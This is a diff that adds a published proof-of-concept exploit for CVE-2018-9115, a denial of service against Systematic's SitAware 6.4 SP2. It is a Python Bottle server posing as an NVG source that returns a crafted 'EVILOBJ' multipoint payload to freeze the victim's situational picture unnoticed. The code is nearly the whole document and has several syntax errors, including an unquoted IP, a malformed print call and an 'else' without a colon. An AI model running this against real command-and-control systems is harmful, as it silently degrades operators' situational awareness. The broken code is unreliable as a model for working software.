@@ -1,0 +1,63 @@
+# Exploit Title: SitAware NVG Denial of Service 
+# Date: 03/31/2018
+# Exploit Author: 2u53
+# Vendor Homepage: https://systematic.com/defence/products/c2/sitaware/
+# Version: 6.4 SP2
+# Tested on: Windows Server 2012 R2
+# CVE: CVE-2018-9115
+
+# Remarks: PoC needs bottlypy:
+# https://bottlepy.org/docs/dev/
+# https://raw.githubusercontent.com/bootlepy/bottle/master/bottle.py
+
+# Systematic's SitAware does not validate input from other sources suffenciently. Incoming information utilizing 
+# the for example the NVG interface. The following PoC will freeze the Situational Layer of SitAware, which means
+# that the Situational Picture is no more updated. Unfortunately the user can not notice until 
+# he tries to work with the situational layer. 
+
+
+#!/bin/python
+
+from bottle import post, run, request, response
+
+LHOST = 127.0.0.1 # Local IP which the NVG server should use
+LPORT = 8080 # Local Port on which the NVG server should listen
+
+GET_CAPABILITIES = '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
+<ns3:GetCapabilitiesResponse xmlns="http://purl.org/dc/elements/1.1/" xmlns:ns2="http://purl.org/dc/terms/" xmlns:ns3="http://tide.act.nato.int/schemas/2008/10/nvg" xmlns:ns4="http://tide.act.nato.int/wsdl/2009/nvg">
+<ns4:nvg_capabilities version="1.5">
+</ns4:nvg_capabilities>
+</ns3:GetCapabilitiesResponse>
+</soap:Body>
+</soap:Envelope>'''
+
+EVIL_NVG = '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
+<ns3:GetNvgResponse xmlns="http://purl.org/dc/elements/1.1/" xmlns:ns2="http://purl.org/dc/terms/" xmlns:ns3="http://tide.act.nato.int/schemas/2008/10/nvg" xmlns:ns4="http://tide.act.nato.int/wsdl/2009/nvg">
+<ns4:nvg version="1.5" classification="NATO UNCLASSIFIED">
+<ns4:multipoint points="-0.01,0.01 0.02,-0.02 0.01,0.01" symbol="2525b:GFTPZ---------X"
+label="EVILOBJ"/>
+</ns4:nvg>
+</ns3:GetNvgResponse>
+</soap:Body>
+</soap:Envelope>'''
+
+@post('/nvg')
+def soap():
+    action = dict(request.headers.items()).get('Soapaction')
+    action = action.replace('"', '')
+    print('Incoming connection')
+
+    response.content_type = 'text/xml;charset=utf-8'
+
+    if action.endswith('nvg/GetCapabilities'):
+        print('Sending capabilities to victim'...)
+        return GET_CAPABILITIES
+        print('Done! Waiting for NVG request...')
+    elif action.endswith('nvg/GetNvg'):
+        print('Sending evil NVG')
+        return EVIL_NVG
+        print('Done!')
+    else
+        print('Invalid request received')
+
+run(host=LHOST, port=LPORT)
